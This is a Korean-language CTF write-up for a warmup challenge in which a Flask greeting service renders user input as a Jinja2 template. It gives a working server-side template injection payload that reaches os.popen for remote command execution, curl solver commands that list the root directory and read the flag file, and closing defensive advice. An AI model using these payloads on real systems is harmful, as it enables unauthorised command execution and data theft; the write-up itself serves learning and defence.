---
title: "[Warmup] Templates"
description: Writing about the "Templates" of 0xFun CTF 2026.
date: 2026-02-15 01:00:00 +0900
categories: [0xFun CTF 2026]
tags: [Warmup]
toc: true
comments: false
---

## TL;DR
입력값 `name`이 서버에서 **Jinja2 템플릿으로 그대로 렌더링**되어 **SSTI(Server-Side Template Injection)**가 발생  
`{{ cycler.__init__.__globals__.os.popen('...').read() }}` 체인으로 서버에서 명령을 실행(RCE)한 뒤  
`/app/flag.txt`를 읽어 플래그를 획득했다.

---

## Overview
“Greeting Service”는 이름을 입력하면 인사 메시지를 SSR로 렌더링해주는 단순 웹 서비스다.
응답 헤더에서 `Werkzeug/Python` 기반이 확인되었고, 입력 파라미터 `name`이 HTML 응답에 반영되는 구조였다.
템플릿 엔진(Jinja2)의 표현식(`{{ ... }}`)이 서버에서 평가되는지 확인 후, 전역 네임스페이스 접근을 통해 `os.popen()`으로 명령 실행이 가능함을 확인했다.

---

## Solution

### 1) Recon
- 기능: /에 POST로 name=`<input>` 전송 → 페이지가 “greeting” 형태로 렌더링
- DevTools Network에서 확인:
  - Request: POST `http://chall.0xfun.org:49811/`
  - Form Data: name=...

- 응답 헤더에 Werkzeug/2.3.7 Python/3.11.14 → Flask 계열 + Jinja2 가능성 높음

SSTI 여부를 직접 확인하기 위해 Jinja2 표현식 형태의 입력을 시도할 준비를 했다.

---

### 2) Root cause
서버가 사용자 입력을 단순 문자열로 출력하는 게 아니라, **템플릿으로 “평가(render)”** 해버리는 구현 실수가 있었다.

정상 구현(안전):
- `render_template("index.html", name=user_input)`
- 템플릿에서 `{{ name }}`로 “값”만 출력

취약 구현(추정):
- `render_template_string(user_input)` 또는
- 입력값을 템플릿 문맥에 넣지 않고 **입력 자체를 템플릿으로 컴파일/렌더링**

그 결과 `{{ ... }}`가 서버에서 실행되어 SSTI가 성립했다.

---

### 3) Exploit (PoC)

#### (1) 정상 출력 확인
목표는 SSTI를 이용해 파이썬 전역 객체에 도달 → `os.popen()` 실행 → 파일 읽기다.

Jinja2에는 기본 제공 객체들이 존재하고, 그 중 `cycler`를 통해 아래 체인이 가능했다:
- `cycler.__init__` : 함수 객체
- `.__globals__` : 해당 함수의 전역 변수 딕셔너리
- `os` 모듈 접근 후 `os.popen(cmd).read()` 로 명령 실행 결과 획득
먼저 RCE를 검증하기 위해 루트 디렉토리 목록을 출력:

`{{ cycler.__init__.__globals__.os.popen('ls -al /').read() }}`


#### (2) Flag
플래그는 `/app/flag.txt`에 존재했으며, `cat`으로 직접 읽었다:
```bash
curl -s -X POST "$TARGET" -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name={{cycler.__init__.__globals__.os.popen('cat /app/flag.txt 2>&1').read()}}"
```

---

### 4) Why it works
- 이 문제는 “SSTI → RCE”로 이어지는 전형적인 Jinja2 취약점 흐름이다.
- `cycler.__init__.__globals__`는 환경에 따라 차단될 수 있으며, 차단 시에는 `__mro__`, `__subclasses__()` 계열로 우회하는 케이스도 많다.
- 방어 관점:
  - 사용자 입력을 절대 `render_template_string()`에 그대로 넣지 말 것
  - 템플릿은 고정 파일 기반으로 두고, 입력은 “데이터”로만 전달
  - 필요 시 sandboxed environment / strict undefined / 필터링보다 구조적 분리(템플릿-데이터 분리)가 핵심

---

## Solver
```bash
TARGET="http://chall.0xfun.org:49811/"

# RCE 체크
curl -s -X POST "$TARGET" -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name={{cycler.__init__.__globals__.os.popen('ls -al /').read()}}"

# 플래그 획득
curl -s -X POST "$TARGET" -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name={{cycler.__init__.__globals__.os.popen('cat /app/flag.txt 2>&1').read()}}"
```

## Flag
0xfun{Server_Side_Template_Injection_Awesome}

---

